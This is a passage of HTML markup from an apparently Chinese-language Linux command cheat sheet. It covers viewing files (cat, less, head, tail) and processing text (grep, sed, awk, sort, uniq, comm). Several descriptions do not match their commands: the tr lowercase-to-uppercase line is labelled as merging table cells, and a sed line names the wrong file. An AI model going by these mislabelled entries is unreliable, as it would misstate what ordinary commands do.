'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">apt-cache search searched-package 返回包含所要搜索字符串的软件包名称</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"><br></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"><strong>查看文件内容</strong></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">cat file1 从第一个字节开始正向查看文件的内容</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">tac file1 从最后一行开始反向查看一个文件的内容</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">more file1 查看一个长文件的内容</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">less file1 类似于 'more' 命令，但是它允许在文件中和正向操作一样的反向操作</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">head -2 file1 查看一个文件的前两行</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">tail -2 file1 查看一个文件的最后两行</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">tail -f /var/log/messages 实时查看被添加到一个文件中的内容</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"><br></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"><strong>文本处理</strong></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">cat file1 file2 ... | command &lt;&gt; file1_in.txt_or_file1_out.txt general syntax for text manipulation using PIPE, STDIN and STDOUT</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">cat file1 | command( sed, grep, awk, grep, etc...) &gt; result.txt 合并一个文件的详细说明文本，并将简介写入一个新文件中</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">cat file1 | command( sed, grep, awk, grep, etc...) &gt;&gt; result.txt 合并一个文件的详细说明文本，并将简介写入一个已有的文件中</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">grep Aug /var/log/messages 在文件 '/var/log/messages'中查找关键词\"Aug\"</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">grep ^Aug /var/log/messages 在文件 '/var/log/messages'中查找以\"Aug\"开始的词汇</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">grep [0-9] /var/log/messages 选择 '/var/log/messages' 文件中所有包含数字的行</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">grep Aug -R /var/log/* 在目录 '/var/log' 及随后的目录中搜索字符串\"Aug\"</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">sed 's/stringa1/stringa2/g' example.txt 将example.txt文件中的 \"string1\" 替换成 \"string2\"</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">sed '/^$/d' example.txt 从example.txt文件中删除所有空白行</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">sed '/ *#/d; /^$/d' example.txt 从example.txt文件中删除所有注释和空白行</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">echo 'esempio' | tr '[:lower:]' '[:upper:]' 合并上下单元格内容</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">sed -e '1d' result.txt 从文件example.txt 中排除第一行</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">sed -n '/stringa1/p' 查看只包含词汇 \"string1\"的行</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">sed -e 's/ *$//' example.txt 删除每一行最后的空白字符</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">sed -e 's/stringa1//g' example.txt 从文档中只删除词汇 \"string1\" 并保留剩余全部</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">sed -n '1,5p;5q' example.txt 查看从第一行到第5行内容</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">sed -n '5p;5q' example.txt 查看第5行</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">sed -e 's/00*/0/g' example.txt 用单个零替换多个零</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">cat -n file1 标示文件的行数</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">cat example.txt | awk 'NR%2==1' 删除example.txt文件中的所有偶数行</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">echo a b c | awk '{print $1}' 查看一行第一栏</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">echo a b c | awk '{print $1,$3}' 查看一行的第一和第三栏</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">paste file1 file2 合并两个文件或两栏的内容</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">paste -d '+' file1 file2 合并两个文件或两栏的内容，中间用\"+\"区分</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">sort file1 file2 排序两个文件的内容</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">sort file1 file2 | uniq 取出两个文件的并集(重复的行只保留一份)</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">sort file1 file2 | uniq -u 删除交集，留下其他的行</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">sort file1 file2 | uniq -d 取出两个文件的交集(只留下同时存在于两个文件中的文件)</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">comm -1 file1 file2 比较两个文件的内容只删除 'file1' 所包含的内容</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">comm -2 file1 file2 比较两个文件的内容只删除 'file2' 所包含的内容</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">comm -3 file1 file2 比较两个文件的内容只删除两个文件共有的部分</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"><strong>字符设置和文件格式转换</strong></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">dos2unix filedos.txt fileunix.txt 将一个文本文件的格式从MSDOS转换成UNIX</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, 